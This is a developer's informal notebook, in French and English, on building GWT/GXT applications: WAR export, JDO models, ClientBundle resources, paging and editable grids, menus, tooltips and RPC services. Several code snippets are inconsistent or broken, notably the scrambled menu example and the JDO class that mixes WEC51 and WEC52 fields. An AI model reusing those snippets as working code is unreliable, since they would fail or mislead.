How to create a WAR file from a GWT project with Eclipse: OLD VIEUX
        First Time Only: 
        Open folder {PF}\www\com.domain.{Project} 
        Create new folder WEB-INF 
        Open new folder {Project}\www\com.domain.{Project}\WEB-INF 
        Create new folder lib 
        Create new file web.xml (see sample) 
        Open new folder {Project}\www\com.domain.{Project}\WEB-INF\lib 
        Copy file gwt-servlet.jar into this new lib folder 
        Every Time: 
        Run compile script {PF}\{Project}-compile 
        Select your project's src folder in Eclipse 
        Choose to Export... 
        Export to JAR file 
        Check Export generated class files and resources 
        Check Export java source files and resources 
        Set the export destination as {PF}\www\com.domain.{Project}\WEB-INF\lib\{Project}.jar 
        Check Compress the contents of the JAR file 
        Click Next twice 
        Select Generate the manifest file 
        You don't have to check Save the manifest in the workspace 
        Don't Seal the contents (Seal some packages ... Nothing sealed 
        Leave the Main class blank 
        Click Finish 
        Open folder {PF}\www\com.domain.{Project} 
        Select all files and folders 
        Add contents to a zip file named {Project}.war 
        Definitions: 
        {GWT} = Path to the GWT folder containing build scripts (i.e. gwt-windows-1.1.10) 
        {PF} = Path where your project will exist (i.e. C:\Dev\MyProject) 
        {Project} = Project name (should differ from {PF} folder name)

pour faire un nouveau projet GWT:VIEUX OLD
        definir sytem path : %PEAR%;C:\Program Files\maven-2.0.7\bin\;%JAVA_HOME%;C:\gwt-windows-1.4.61\(attention a la version)
        mkdir DynaTable
        cd DynaTable
        projectCreator -eclipse DynaTable
        (si ca ne marche pas cause version java: rajouter en tete de ce fichier: Set Path=C:\gwt-windows-1.4.61\;C:\Program files/JavaSoft/JRE/1.5.0_08/bin)
        applicationCreator -eclipse DynaTable com.google.gwt.sample.dynatable.client.DynaTable
        ou
        applicationCreator -eclipse projetGWT com.pgwt.moduleone.client.ModuleOne
        (si ca ne marche pas cause version java: rajouter en tete de ce fichier: Set Path=C:\gwt-windows-1.4.60\;C:\Program files/JavaSoft/JRE/1.5.0_08/bin)
        Pour prendre un ancien projet non eclipse et en faire un eclipse(pour notemment le debugger debuger): faire un nouveau projet en fait vierge et faire un beyond compare
        Merde le cache : faire un refresh et il recompile tout: java html et css
        Pour supprimer le cache supprimer les fichiers sous .gwtache/bytecode
        Supprimer ce qui ya comme classes sous bin mais normalement pas necessaire: faire un refresh
        le fichier css est pris en compte si il est sous: projetGWT\src\com\pgwt\moduleone\public\ModuleOne.css

Exemple de classe jdo: a mettre cote client : 
                                              package com.renault.wec.client.jdo;
                                            
                                            import ...                                            
                                            @PersistenceCapable(identityType=IdentityType.APPLICATION, detachable="true") // on le declare detacheable comme ca meme si la transaction se ferme, meme si mon service n'est pas permanant: l'id d'un objet est conserve et quand on rappelle makepersistant: il fait un update au lieu d'un insert car cet objet existe en base C EST GENIAAAAALL!!!
                                            public class WEC51_M_TEMPLATE implements ModelData, Serializable 
                                            {
                                            	public static final String NOM = "WEC51_NOM";
                                            	public static final String ID = "WEC51_ID";
                                            	public static final String ACTIVE = "WEC51_ACTIVE";
                                            	@PrimaryKey
                                            	Integer WEC51_ID; // ne pas utiliser long ou int mais Integer pour les chiffres
                   	                         	@PrimaryKey // la cle primaire peut etre composee de deux champs! Bien le mettre si c'est le cas car sinon l'update va udpated avec une mauvaise clause
                                              @Column(jdbcType="VARCHAR", length=3000) // si besoin
                                            	String WEC51_NOM = null;
                                            	String WEC51_ACTIVE = null;
                                                
                                            	public WEC51_M_TEMPLATE()
                                                {
                                                }
                                              public WEC51_M_TEMPLATE(Integer id)
                                                {
                                                    this.WEC51_ID = id;
                                                }
                                                getters et setters...
                                            	@Override // a partir d'ici c'est pour afficher dans un grid tableau (pour le faire rapidement sous eclipse, overrider methodes de modeldata)
                                            	public <X> X get(String property) {
                                            	       if (property != null)
                                            	        {
                                            	            // try to return value
                                            	            if (NOM.equals(property))
                                            	            {
                                            	                return (X) getWEC51_NOM();
                                            	            }
                                            	            else if (ID.contains(property))
                                                    		  {
                                                    			  return (X) String.valueOf(getWEC52_ID()); // je crois donc que ca marche aussi pour les Integer (meme code)
                                                    		  }
                                            	            else if (ACTIVE.equals(property))
                                            	            {
                                            	                return (X) String.valueOf(getWEC51_ACTIVE());
                                            	            }
                                            	        }
                                            	        // could not find value - just return null
                                            	        return null;
                                            
                                            	}
                                            	@Override
                                            	public Map<String, Object> getProperties() {
                                            		   Map<String, Object> properties = new HashMap<String, Object>();
                                            	        for (String property : getPropertyNames())
                                            	        {
                                            	            properties.put(property, get(property));
                                            	        }
                                            	        return properties;
                                            
                                            	}
                                            	@Override
                                            	public Collection<String> getPropertyNames() {
                                            		   Collection<String> names = new ArrayList<String>();
                                            	        names.add(NOM);
                                            	        names.add(ID);
                                            	        names.add(ACTIVE);
                                            	        return names;
                                            	}
                                            	@Override
                                            	public <X> X remove(String property) {
                                            		 return (X) set(property, null);
                                            	}
                                            	@Override
                                            	public <X> X set(String property, X value) {
                                            			 if (property != null && value !=null && !value.toString().equals("null"))
                                        	        {
                                                        X old = (X) get(property);
                                                      try
                                                      {
                                        	            if (OBLCLIEN.contains(property))
                                        	            {
                                        	            	setWEC52_OBLCLIEN(((java.lang.String) value));
                                        	            }
                                        	           if (ID.contains(property))
                                        	            {
                                          	            	setWEC52_ID((Integer)value);
                                         	            }
                                        	         etc...
                                        	         }
                                        	         catch (ClassCastException e)
                                                    {
                                                    	if (value instanceof java.lang.String) old = (X) set(property, Integer.parseInt(value.toString()));
                                                    	else if (value instanceof java.lang.Integer) old = (X) set(property, value.toString());
                                                    	else throw e;
                                                      }
                                                	            return old;
                                                
                                                	        }
                                                	        return null;
                                                	    }

                                                	@Override
                                                	public String toString() {
                                                		return getWEC52_ID()+getWEC51_DEBHTML() + getWEC52_ORDRE();
                                                	}
                                                	
                                                
                                                	}
      Clientbundle: meilleure methode pour definir le css comme ca je peux dev avec superdevmode : 
      classe de resources:
                  package com.application.yoani.client.resources;
                                  public interface YoaniResources extends ClientBundle {
                                  	  public static final YoaniResources INSTANCE =  GWT.create(YoaniResources.class);
                                  	  
                                  	  
                                  	  @ClientBundle.Source("com/kanail/client/SamiCours.css")
                                  	  @CssResource.NotStrict // mettre ca pour ne pas avoir de pb de type besoin de mettre @external obfuscated
                                  	  public Css cssGrowingSchoolbag();
                                  
                                  	  @NotStrict
                                  	  @Source("com/application/yoani/client/resources/gxt-all.css")
                                  	  public Css cssGWT();
// ensuite dans mon module entrypoint je mettrais : 
                                        public void onModuleLoad() 
	                                    {
                                                  Resources.INSTANCE.css().ensureInjected();
                                                  ......
                                                  Mais si je veux pouvoir virer un css apres n'importe ou  faire ca : 
                                                  // Equivalent to MyClass.INSTANCE.ensureInjected()
                                                  StyleElement e  = StyleInjector.injectStylesheet(MyClass.INSTANCE.css().getText());
                                                  // Remove the injected css element
                                                  e.removeFromParent();
                                                  

                                  	  /*
                                  pour les datas : ?
                                  	  @Source("test.txt")
                                  	  public DataResource test();
                                  	  
                                  pour des fichiers de type autre : 
                                  	  @Source("manual.pdf")
                                  	  public DataResource ownersManual();
                                  	  
                                  	  
                                  pour les fichiers textes (pas bien compris... sinon voir plus bas):
                                  		@Source("synchronous.txt") ou xml
                                  			  TextResource synchronous();
                                  			  VALABLE POUR TOUTES LES RESSOURCES!!  C genial:est compatible avec i18n: voici l'ordre de recherche si on est en francais
                                  	    1.  synchronous_fr_FR.txt
                                     		2. synchronous_fr.txt
                                     		3. synchronous.txt
                                  		//ailleurs : :
                                  		//		 Using a TextResource
                                  				myTextArea.setInnerText(Resources.INSTANCE.synchronous().getText());
                                  		
                                  			  @Source("b.txt")
                                  			  ExternalTextResource asynchronous();
                                  			}
                                  		//ailleurs : Using an ExternalTextResource
                                  		Resources.INSTANCE.asynchronous().getText(new ResourceCallback<TextResource>() {
                                  		  public void onError(ResourceException e) { ... }
                                  		  public void onSuccess(TextResource r) {
                                  		    myTextArea.setInnerText(r.getText());
                                  		  }
                                  		});
                                  pour les fichiers textes i18n:
                                        creer une interface: (une interface peut avoir des methodes statiques donc pas obligé de faire des classes abstraites ?) 
                                                  public interface Labels extends com.google.gwt.i18n.client.Messages
                                                  {
                                                  	String connexion();
                                                  	String enterYourUserNameAndPassword();
                                                  }
                                          dans une autre classe: 
                                                Labels constants = (Labels)GWT.create(Labels.class);
                                                loginForm.setHeading(constants.connexion());
                                          et sous le repertoire client j'ai  
                                            	    1. Labels_fr_FR.txt
                                               		2. Labels_fr.txt
                                               		3. Labels.txt
                                    
                            
                            pour les images :
                            dans 
                            public interface YoaniResources extends ClientBundle {
	                               public static final YoaniResources INSTANCE =  GWT.create(YoaniResources.class);
                            		@Source("logo.png")                               (cette image est stockee sous monapp/client/resources)
                            		 @ImageOptions(flipRtl = true) // flip horizontally
                            		 @ImageOptions(flipRtl = repeatStyle) // repeter image
                                 @ImageOptions(width = 10) // taille de l'image (size)// attention non je pense que ca ne marche pas 
                            		  ImageResource logo();
                            		  ailleurs: 
                            		  Resources resources = GWT.create(Resources.class);
                            		Image img = new Image(resources.logo());
                            		ou si j'ai un bouton bt:
                                bt.setIcon(AbstractImagePrototype.create(resources.logo()));
                                  a savoir: 
                                      *  ImageBundle becomes ClientBundle
                                      * AbstractImageProtoype becomes ImageResource
                                      * AbstractImagePrototype.createImage() becomes new Image(imageResource)
                                      * Other methods on AbstractImagePrototype can continue to be used by calling AbstractImagePrototype.create(imageResource) to provide an API wrapper.
                            
                            pour recuperer dynamiquement une classe: ( je ne vois pas trop l'interet du truc)
                            				interface Resources extends ClientBundle {
                            				  Resources INSTANCE = GWT.create(Resources.class);
                            				
                            				  @ClassType(SomeClass.class)
                            				  GwtCreateResource<ReturnType> factory();
                            				}
                            				
                            				// Elsewhere
                            				ReturnType obj = Resources.INSTANCE.factory().create();
                            */
                            
                            
                            
                            }                                                	

GXT :
pagination sur un grid :
      RpcProxy proxy = new RpcProxy()
       {
          protected void load(Object o, AsyncCallback asyncCallback)
          {
              serviceStorage.getServiceStorageList((PagingLoadConfig)o, asyncCallback); // dans mon bablaServiceAsync j'ai  : void getServiceStorageList(PagingLoadConfig config, AsyncCallback<PagingLoadResult<WECM53_STORAGE_CONTROL>> asyncCallback) throws IllegalArgumentException;
          }
        };
          final PagingLoader<PagingLoadResult<WECM55_STORAGE_IAO_CONTROL>> loader = new BasePagingLoader<PagingLoadResult<WECM55_STORAGE_IAO_CONTROL>>(proxy);
	       private ListStore<WECM55_STORAGE_IAO_CONTROL> store= new ListStore<WECM55_STORAGE_IAO_CONTROL>(loader);
	       ColumnModel cm;	
	       protected Grid<WECM55_STORAGE_IAO_CONTROL> grid =new EditorGrid<WECM55_STORAGE_IAO_CONTROL>(store, cm);
	       	final PagingToolBar bar = new PagingToolBar(9);
        public void init(final WecApp wecApp) 
      	{
      	 // sert à savoir quand le chargement est termine mais c facultatif: c pour mon petit bandeau chargement
      		LoadListener ll = new LoadListener()
      		{
      		@Override
      			public void handleEvent(LoadEvent e) 
      		{
      				wecApp.chargement.hide();
      			}	
      		};
         		loader.setRemoteSort(true);
      	 		loader.addLoadListener(ll
      	 		bar.bind(loader);
          	buildInterface(); // ma methode pour construire toutes mes colonnes
          		wecApp.hc.add(cp, "td.centercenter");
          		loader.load();
          }	
	
pour qu'un element soit draguable et fermable l'inclure dans un objet Dialog
	    Dialog complex = new Dialog();
	    complex.setBodyBorder(false);  
				complex.setWidth(900);  
				complex.setHeading(wectemplate.getWEC51_NOM().concat(": "+result.length + " champs"));
			    complex.setHeight(600);
			    complex.setScrollMode(Scroll.AUTOY);
			    complex.setHideOnButtonClick(true);  
			    complex.setBottomComponent(null);
			    BorderLayout layout = new BorderLayout();  
			    complex.setLayout(layout);
	    complex.add(addForm);
	    complex.scrollIntoView(addForm);
Dans la classe d'un bouton qui lui meme est dans une classe parent, pour faire reference à cette classe parente mere du bouton :
    WecM55StorageIAOControlTable.this.displayAddForm();
Pour empecher le scroll sur une page :
  <body style="overflow:scroll; width:100%; position: fixed;">
pour mettre un scrollbar vertical ou horizontal: 
        tradForm.setScrollMode(Scroll.AUTOY);
pour debugger debuger voir dans gwt:
pour faire un message de confirmation sur l'appui d'un bouton ou autre :
     		Button insert = new Button("blah",   new SelectionListener<ButtonEvent>()  
     {  
	          @Override
	             public void componentSelected(ButtonEvent ce) 
	             {
	        	  	   MessageBox.confirm("Confirm", "Sure?", new Listener<MessageBoxEvent>()
	        				{
        	    				public void handleEvent(MessageBoxEvent be) 
        	    				{
                          if (!be.getButtonClicked().getText().equals("No"))
		    					       {
        	    					 ...
        	    					}
        	    				}
	    			      });
	    		  
				      }
				});
        
classe utility
                                            package com.application.goameg.client.utilities;
                                            
                                            import java.util.ArrayList;
                                            import java.util.List;
                                            
                                            import com.application.goameg.client.Constants;
                                            import com.extjs.gxt.ui.client.data.ModelType;
                                            import com.extjs.gxt.ui.client.widget.grid.ColumnConfig;
                                            import com.extjs.gxt.ui.client.widget.grid.ColumnModel;
                                            import com.google.gwt.json.client.JSONArray;
                                            import com.google.gwt.json.client.JSONParser;
                                            import com.google.gwt.json.client.JSONValue;
                                            
                                            public class Utility {
                                            
                                            	public static ModelType getGenerateModelTypeFromQuey(String sqlQuery) {
                                            		sqlQuery = sqlQuery.toUpperCase();
                                            		int from = sqlQuery.indexOf("FROM");
                                            		int select = sqlQuery.indexOf("SELECT")+6;
                                            		String columns = sqlQuery.substring(select, from);
                                            		String[] split = columns.split(",");
                                            		ModelType type = new ModelType();
                                            		type.setRoot("records");
                                            		type.setTotalName("totalCount");// important. Is used by the pagination tool. (pfff ca c vieux! ou bien c du json)
                                            		type.addField("RNUM","RNUM");
                                            		for (int i = 0; i < split.length; i++) {
                                            			type.addField(split[i].trim().toUpperCase(),split[i].trim().toUpperCase());
                                            			}
                                            		//Log.debug(type.getField("FWS99IDLBL").getName());
                                            		return type;
                                            	}
                                            	public static ModelType getGenerateModelType() {
                                            		return null;
                                            	}
                                            	
                                            	public static ColumnModel getGenerateColumnModelFromJSONString(String columns) {
                                            		JSONValue jv = JSONParser.parse(columns);
                                            		JSONArray jva = jv.isArray();
                                            		List<ColumnConfig> cols = new ArrayList<ColumnConfig>();
                                            		for (int i =0; i<jva.size(); i++)
                                            		{
                                            		int size = Integer.parseInt(jva.get(i).isArray().get(2).isNumber().toString())*10;
                                            		
                                            		ColumnConfig cc = new ColumnConfig(jva.get(i).isArray().get(0).isString().stringValue(), jva.get(i).isArray().get(1).isString().stringValue(),size);
                                            		cc.setMenuDisabled(true);
                                            		cc.setWidth(50);
                                            		cc.setSortable(false);
                                            		cols.add(cc);
                                            		}
                                            		ColumnModel cm = new ColumnModel(cols);
                                            		
                                            		return cm;
                                            	}
                                            	public static ColumnModel getGenerateColumnModel() {
                                            		String columns = "merd";
                                            		JSONValue jv = JSONParser.parse(columns);
                                            		JSONArray jva = jv.isArray();
                                            		List<ColumnConfig> cols = new ArrayList<ColumnConfig>();
                                            		for (int i =0; i<jva.size(); i++)
                                            		{
                                            		int size = Integer.parseInt(jva.get(i).isArray().get(2).isNumber().toString())*10;
                                            		
                                            		ColumnConfig cc = new ColumnConfig(jva.get(i).isArray().get(0).isString().stringValue(), jva.get(i).isArray().get(1).isString().stringValue(),size);
                                            		cc.setMenuDisabled(true);
                                            		cc.setWidth(50);
                                            		cc.setSortable(false);
                                            		cols.add(cc);
                                            		}
                                            		ColumnModel cm = new ColumnModel(cols);
                                            		
                                            		return cm;
                                            	}
                                            	/**
                                            	   * Redirect to URL, changing by the windows .location
                                            	   * @param url The new URL who remplace the current like http://www.gwt.com/
                                            	   */  
                                            	   public  static native void windowLocation(String url)/*-{
                                            		$wnd.location = url;
                                            	  }-*/;	  
                                            
                                            	  /**
                                            	   * Open new (tab) browser to URL, open with window.open() 
                                            	   * @param url The new URL to open like http://www.gwt.com/
                                            	   */
                                            	  public static native void windowOpen(String url)/*-{
                                            			$wnd.open(url);
                                            	  }-*/;
                                            
                                            	   /**
                                            	   * Redirige la page en cours vers la nouvelle URL
                                            	   * @param url L'url qui remplacera l'actuelle
                                            	   */ 
                                            	  public static void pageRediriger(String url)
                                            	  {
                                            		  windowLocation(url); // plutot : Window.Location.assign("http://www.wenhuaduverge.com/shop/");
                                            	  }	 
                                            
                                            	  /**
                                            	   * Ouvre dans le navigateur, une nouvelle page ou onglet a destination de URL
                                            	   * @param url L'url a ouvrir dans un nouvel onglet ou un nouveau navigateur
                                            	   */
                                            	  public static void pageOuvrir(String url)
                                            	  {
                                            		  windowOpen(url);
                                            	  }
                                            
                                            }

pour faire un menu:
        bar = new MenuBar(); // c'est la ligne de base horizontale
        bar.setBorders(false);
        bar.setStyleName("menu");
        Menu menu = new Menu(); // c'est une ligne verticale  
		     MenuItem item1 = new MenuItem("New");      // c'est un element de la ligne verticale
		     item1.addListener(Events.Select, new Listener<ComponentEvent>() {  
		          	        public void handleEvent(ComponentEvent be) {  menu.add(item1);  
		           	          wecApp.loadOnglets();MenuItem item2 = new MenuItem("Open File");  
		           	        wecApp.loadTemplates();menu.add(item2);  
		           	        wecApp.loadServices();  Menu sub = new Menu();                    
		           	          }});
          sub.add(new MenuItem("readme.txt"));  
		     sub.add(new MenuItem("helloworld.txt"));  
		     item2.setSubMenu(sub);                    // menu > menuItem > menu > menuItem etc.
 
		     bar.add(new MenuBarItem("File", menu)); //MenuBar(Menu(MenuItems(Menu(MenuItems)))

		     Menu sub2 = new Menu();  
		     sub2.add(new MenuItem("Cut"));  
		     sub2.add(new MenuItem("Copy"));  
		     MenuBarItem edit = new MenuBarItem("Edit", sub2);  
		     bar.add(edit);  
		     sub = new Menu();  
		     sub.add(new MenuItem("Search"));  
		     sub.add(new MenuItem("File"));  
		     sub.add(new MenuItem("Java"));  
		     MenuBarItem item3 = new MenuBarItem("Search", sub);  
		     bar.add(item3);  
		     menu = new Menu();  
		     CheckMenuItem menuItem = new CheckMenuItem("I Like Cats");  
		     menuItem.setChecked(true);  
		     menu.add(menuItem);  
		     menuItem = new CheckMenuItem("I Like Dogs");  
		     menu.add(menuItem);  
		     menu.add(new SeparatorMenuItem());  
		     MenuItem radios = new MenuItem("Radio Options");  
		     menu.add(radios);  
		     Menu radioMenu = new Menu();  
		     CheckMenuItem r = new CheckMenuItem("Blue Theme");  
		     r.setGroup("radios");  
		     r.setChecked(true);  
		     radioMenu.add(r);  
		     r = new CheckMenuItem("Gray Theme");  
		     r.setGroup("radios");  
		     radioMenu.add(r);  
		     radios.setSubMenu(radioMenu);  
		     MenuItem date = new MenuItem("Choose a Date");  
		     date.setIcon(AbstractImagePrototype.create(resources.logo()));  
		     menu.add(date);  
		     date.setSubMenu(new DateMenu());  
		     MenuBarItem item4 = new MenuBarItem("Foo", menu);  
		     bar.add(item4);  

pour faire un tableau
                                  private ListStore<WEC56_M_VALPHASE> store= new ListStore<WEC56_M_VALPHASE>();
                                  private WEC51_M_TEMPLATEServiceAsync templateServiceValPhase = GWT.create(WEC51_M_TEMPLATEService.class);
                                  
                                  templateServiceValPhase.getValphaseFromTemplate(f,new AsyncCallback<WEC56_M_VALPHASE[]>() 
                            	    {
                                    	public void onFailure(Throwable caught) 
                            			   {
                            				    wecAppEntry.chargement.hide();
                            					   MessageBox.alert("Result", "Failure"+ caught, null);
                            			   }
                            			   @Override
			                         			public void onSuccess(WEC55_D_VALCHM[] result) 
                              			{
                              							List<ColumnConfig> configs = new ArrayList<ColumnConfig>();
                                      				ColumnConfig column1 = new ColumnConfig();  
                                                    column1.setId(WECM53_STORAGE_CONTROL.CSIA);  
                                                    column1.setHeader("Sia");  
                                                    column1.setWidth(60);
                                                    configs.add(column1); 
                                                    ColumnConfig column2 = new ColumnConfig();  
                                                    column2.setId(WECM53_STORAGE_CONTROL.CSIA);  
                                                    column2.setHeader("Sia");  
                                                    column2.setWidth(60);
                                                    configs.add(column2);
                                              (...) 
                              				ColumnModel cm = new ColumnModel(configs);
                              				store.add(Arrays.asList(result));
                              				grid = new Grid<WEC55_D_VALCHM>(store, cm);
						                          grid.setBorders(true);
						                          grid.setSize(800, 200);
                              				cp = new ContentPanel();  
                              				 cp.setBodyBorder(false);  
                              			      cp.setHeading("Valeurs");  
                              			      cp.setButtonAlign(HorizontalAlignment.CENTER);  
                              			        
                              			      cp.setSize(800, 700);
                              			    cp.add(grid);
pour avoir la barre de defilement verticale dans un tableau: scrollbar
        cp.setSize(600, 700); le cp qui contient le tableau doit avoir un width un peu plus petit... chais pas pourquoi. Ici ci c 800 ca marche pas. Ca marche si c 600
pour faire des drag and drop dans un meme tableau rajouter ca : 
         new GridDragSource(grid);  
         GridDropTarget target = new GridDropTarget(grid);  
         target.setAllowSelfAsSource(true);  
         target.setFeedback(Feedback.INSERT);  
         
pour ajouter un bouton en bas au tableau:
              contentPannel.add(grid);
              contentPannel.addButton(monbouton);
pour faire un tableau editable (facon excell ou avec des cellules en select ou en texte saisissable) :
          ne pas utiliser Grid mais EditorGrid et pour la colonne qu'on veut rendre editable faire: (ca executera automatiquement au changement la metode 	public <X> X set(String property, X value) { de mon model.)
          // sinon c'est nouveau on peut aussi utiliser la classe RowEditor mais j'ai pas d'exemple dessus... ca a l'air tres tres bien 
          (exemple combo box select: )
                      final SimpleComboBox<String> combo = new SimpleComboBox<String>();  
                      combo.setForceSelection(true);  
                      combo.setTriggerAction(TriggerAction.ALL);  
                      combo.add("ON");
                      combo.add("OFF");  
                      //combo.setDisplayField(WEC51_M_TEMPLATE.ACTIVE);
                      CellEditor editor = new CellEditor(combo) {
                
                    	  @Override  
                          public Object preProcessValue(Object value) {  
                            if (value == null) {  
                              return value;  
                            }  
                            return combo.findModel(value.toString());  
                          }  
                      
                          @Override  
                          public Object postProcessValue(Object value) {  
                            if (value == null) {  
                              return value;  
                            }  
                            return ((ModelData) value).get("value");  
                          }  
                      };
                      column = new ColumnConfig();  
                      column.setId(WEC51_M_TEMPLATE.ACTIVE);  
                      column.setHeader("Active");  
                      column.setWidth(60);
                      column.setEditor(editor);
                      configs.add(column); // c'est List<ColumnConfig> configs = new ArrayList<ColumnConfig>();
          exemple texte :
                TextField<String> text = new TextField<String>();  
                text.setAllowBlank(true);  
                column = new ColumnConfig();
                column.setEditor(new CellEditor(text));
                column.setId(WEC51_M_TEMPLATE.NOM);  
                column.setHeader("Nom");  
                column.setWidth(100);  
                //column.setRenderer(buttonRenderer);  
                configs.add(column); // C'est List<ColumnConfig> configs = new ArrayList<ColumnConfig>();  
      (...)
      ensuite rajouter un bouton à mon contentpanel en bas qui contient mon grid qui fera ca: 
                            saveBt = new Button("Sauver", new SelectionListener<ButtonEvent>() 
                         	    	 {  
                       			       public void componentSelected(ButtonEvent ce) 
                       			       {
                       			    	   store.commitChanges(); // store c'est le liststore qui est declare dans le grid
                                              WEC51_M_TEMPLATEServiceAsync templateService = GWT.create(WEC51_M_TEMPLATEService.class);
                                              templateService.updateTemplateList(store.getModels(),new AsyncCallback<WEC51_M_TEMPLATE[]>() 
                                     	    		{
                                     	    			public void onFailure(Throwable caught) 
                                     	    			{
                                     	    					// Show the RPC error message to the user
                                     	    					MessageBox.alert("Result", "Failure"+ caught, null);
                                     	    			}
                                           			@Override
                                           			public void onSuccess(WEC51_M_TEMPLATE[] result) 
                                           			{
                                           				MessageBox.alert("Result", "ok", null);
                                           			}
                                     	           });
                       			    	}
                       			    	   public void onFailure(Throwable caught) 
                            	    			{
                            	    					MessageBox.alert("Result", "Failure"+ caught, null);
                            	    			}
                      			       });
                           
        pour mettre un bouton ou n'importe quoi à chaque ligne de mon grid : 
                            GridCellRenderer<WEC51_M_TEMPLATE> buttonRenderer = new GridCellRenderer<WEC51_M_TEMPLATE>() 
                          {  
                              private boolean init;  
                              public Object render(final WEC51_M_TEMPLATE model, String nomMisDansColumnSetId, ColumnData config, final int rowIndex, final int colIndex, ListStore<WEC51_M_TEMPLATE> store, Grid<WEC51_M_TEMPLATE> grid) 
                              {  
                                Button b = new Button((String) model.get(nomMisDansColumnSetId), new SelectionListener<ButtonEvent>() 
                                {  
                                  @Override  
                                  public void componentSelected(ButtonEvent ce) 
                                  {  
                                    Info.display(model.getWEC51_NOM(), "<ul><li>" + model.getWEC51_CLASS() + "</li></ul>"); // aussi utiliser &bull; ou &#9632;  
                                  }  
                                });  
                                //b.setWidth(grid.getColumnModel().getColumnWidth(colIndex) - 10);  
                                b.setToolTip("Cliquer pour copier complettement ce composant");  
                                return b;  
                              }  
                            };  
                          
                          ColumnConfig column = new ColumnConfig();  
                          column.setHeader("Copier"); 
                          column.setId("cp");
                          column.setWidth(60);
                          column.setRenderer(buttonRenderer);
                          configs.add(column);// c'est List<ColumnConfig> configs = new ArrayList<ColumnConfig>();
                                                                 
pour faire un textarea :
    TextArea field = new TextArea();
pour faire des onglets : 
                                  TabPanel folder = new TabPanel();  
                            	    folder.setWidth(450);  
                            	    folder.setAutoHeight(true);  
                            	  
                            	    TabItem infrastructure = new TabItem("Infrastructure");  
                            	    //shortText.addStyleName("pad-text");  
                            	    infrastructure.add(null); // ici je mets le widget que je veux  
                            	    folder.add(infrastructure);
                                  // pour que quand je clique sur l'onglet un code s'execute:  
                                      infrastructure.addListener(Events.Select, new Listener<ComponentEvent>() {  
                            	        public void handleEvent(ComponentEvent be) {  
                            	          loadTemplates();  
                            	          }});
                                    
                                                           	  
                            	    TabItem services = new TabItem("Services");  
                            	    //longText.addStyleName("pad-text");  
                            	    services.add(null);  // ici je mets le widget que je veux
                            	    folder.add(services);
                            	    hc.add(folder, "td.centercenter");
si j'ai l'erreur : Service implementation URL not specified ou bien l'erreur Failurecom.google.gwt.user.client.rpc.IncompatibleRemoteServiceException: This application is out of date, please click the refresh button on your browser. ( Blocked attempt to access interface 'com.renault.wec.client.services.WEC71_M_SCEService', which is not implemented by 'com.renault.wec.server.WEC51_M_TEMPLATEServiceImpl'; this is either misconfiguration or a hack attempt )
        verifier mon web.xml il doit y avoir une servlet du meme nom toto que 
        ce qui ya dans ma classe de service 
        @RemoteServiceRelativePath("toto")
pour faire des boutons pour chaque ligne comme des checkboxes: (on est en train de looper sur un result[] avec i++) 
                Button enableDisable = new Button("Activer/Desactiver", new SelectionListener<ButtonEvent>() 
      	    	    	 {  
            			       public void componentSelected(ButtonEvent ce) 
            			       {
            			    	   WEC52_M_CHAMPS f = (WEC52_M_CHAMPS)ce.getButton().getData("field");
            			    	   MessageBox.alert("Result", "I clicked on "+ f.getWEC52_NOM(), null);
            			    	   }
            			    	   public void onFailure(Throwable caught) 
                 	    			{
                 	    					MessageBox.alert("Result", "Failure"+ caught, null);
                 	    			}
                       			@Override
                       			public void onSuccess(WEC52_M_CHAMPS result) 
                       			{
                       				Widget f = (Widget)ce.getButton().getData("widgetField");
                       				if (result.getWEC52_FORMCLIEN().startsWith("ex"))
                       				{
                    	    				f.setStyleName("x-item-disabled");
                       				}
                       			}
            			    	   
         			       }});
                	    	  enableDisable.setData("field", result[i]);
                       	 enableDisable.setData("widgetField", widgetField);
             	 widgetField.add(enableDisable);
  	  
pour ajouter des checkboxe à chaque ligne du tableau : 
        // add checkboxes
        				final CheckBoxSelectionModel<ModelData> sm = new CheckBoxSelectionModel<ModelData>();
        				sm.setSelectionMode(SelectionMode.MULTI);
        				sm.addSelectionChangedListener(new SelectionChangedListener<ModelData>()
        						{
        					@Override
        					public void selectionChanged(SelectionChangedEvent<ModelData> se) {
        						for (ModelData md :se.getSelection())
        						{
        							Log.debug(md.get(type.getField(0).getName()).toString());
        						}
        		
        					}
        						});
        				cm.getColumns().add(0, sm.getColumn());
        				grid.addPlugin(sm);
        				grid.setSelectionModel(sm);
        		      	    	  
	    	 
  pour faire une infobulle sur in widget: 
    monwidget.setTitle("blah");
pour faire une infobulle de type tooltip plus perfectionnee:
        pour que cette tooltip n'aie qu'une seule instance il faut que sa variable soit globale dans la classe (instances multiples) 
                  btn = new Button("Closable");  
                  ToolTipConfig config = new ToolTipConfig();  
                  config.setTitle("Information");  
                  config.setText("Prints the current document"); on peut y mettre du html avec tables et tout  
                  config.setCloseable(true);  
                  btn.setToolTip(config);  
                  hp.add(btn);  
                
                  btn = new Button("Mouse Tracking");  
                  config = new ToolTipConfig();  
                  config.setTitle("Information");  
                  config.setText("Prints the current document"); on peut y mettre du html avec tables et tout    
                  config.setTrackMouse(true);  
                  btn.setToolTip(config);  
                  hp.add(btn);  
                
                  btn = new Button("Anchor");  
                  config = new ToolTipConfig();  
                  config.setTitle("Information");  
                  config.setText("Prints the current document"); on peut y mettre du html avec tables et tout    
                  config.setMouseOffset(new int[] {0, 0});  
                  config.setAnchor("left");  
                  btn.setToolTip(config);  
                  hp.add(btn);  
                
                  btn = new Button("Custom");  
                  config = new ToolTipConfig();  
                  config.setText("Prints the current document"); on peut y mettre du html avec tables et tout    
                  config.setTitle("Template Tip");  
                  config.setMouseOffset(new int[] {0, 0});  
                  config.setAnchor("left");  
                  config.setTemplate(new Template(getTemplate(GWT.getHostPageBaseURL())));  
                  config.setCloseable(true);  
                  config.setMaxWidth(415);  
                  btn.setToolTip(config);  
pour setter un style à un element: 
    t2.setStyleName("x-menu-text"); ou dans le css il y a ecrit :
              .x-menu-text {
                ... etc...
pour faire appel a un service :
        il y a trois classes a faire : templateServiceAsync(sous client), templateService(sous client), templateServiceImpl(sous server)
                 templateServiceAsync = 
                                          public interface TemplateServiceAsync {
                                          void getTemplateById(String type, AsyncCallback<WEC53_D_CMPDMD> callback)   throws IllegalArgumentException;
                                          void getTemplateList(AsyncCallback<WEC51_M_TEMPLATE[]> callback)   throws IllegalArgumentException;
                 templateService = 
                                            @RemoteServiceRelativePath("totototo") // attention important: mettre dans le fichier web.xml ce qui correspond. voir :-)
                                            public interface TemplateService extends RemoteService {
                                            WEC53_D_CMPDMD getTemplateById(String type) throws IllegalArgumentException;
                                            WEC51_M_TEMPLATE[] getTemplateList() throws IllegalArgumentException;(interface de )>templateServiceImpl
